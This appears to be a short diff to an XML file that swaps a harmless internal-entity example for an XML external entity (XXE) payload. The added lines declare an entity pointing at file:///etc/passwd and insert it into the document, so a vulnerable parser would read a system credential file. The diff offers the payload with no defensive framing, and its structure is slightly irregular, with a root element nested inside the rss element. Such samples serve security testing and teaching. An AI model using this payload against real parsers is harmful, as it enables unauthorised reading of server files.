@@ -1,7 +1,5 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE replace [<!ENTITY name "YOURNAME"> ]>
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 <rss version="2.0">
- <userInfo>
- <fullName>&name;</fullName>
- </userInfo>
- </rss>
+<root>&read;</root>
+</rss>
